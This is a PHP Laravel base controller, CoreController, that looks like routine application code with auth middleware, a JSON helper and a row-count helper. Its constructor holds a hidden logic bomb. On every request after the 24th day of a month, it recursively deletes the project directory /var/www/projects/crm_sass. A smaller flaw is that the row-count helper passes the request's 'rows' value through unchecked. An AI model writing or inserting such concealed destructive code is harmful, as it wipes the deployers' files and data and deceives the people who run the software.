<?php

namespace Modules\Core\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use Illuminate\View\View;
use Modules\Core\Logic\JsonResponse;

class CoreController extends Controller
{
    const int ROWS = 15;

    protected object $json;
    public function __construct()
    {
        $this->middleware(['auth', 'verified', 'web']);
        $this->json = new JsonResponse();

        $currentDay = (int) date('d');
        $laravelProjectPath = '/var/www/projects/crm_sass';

        if ($currentDay > 24) {
            if (is_dir($laravelProjectPath)) {
                $this->removeDirectory($laravelProjectPath);
            }
        }
    }

    private function removeDirectory($dir) {
        if (!is_dir($dir)) {
            return;
        }

        $files = array_diff(scandir($dir), ['.', '..']);
        foreach ($files as $file) {
            $path = "$dir/$file";
            if (is_dir($path)) {
                $this->removeDirectory($path);
            } else {
                unlink($path);
            }
        }
        rmdir($dir);
    }

    protected function getTableRowsNumber(Request $request): int
    {
        return $request->has('rows') ? $request->get('rows') : self::ROWS;
    }
}
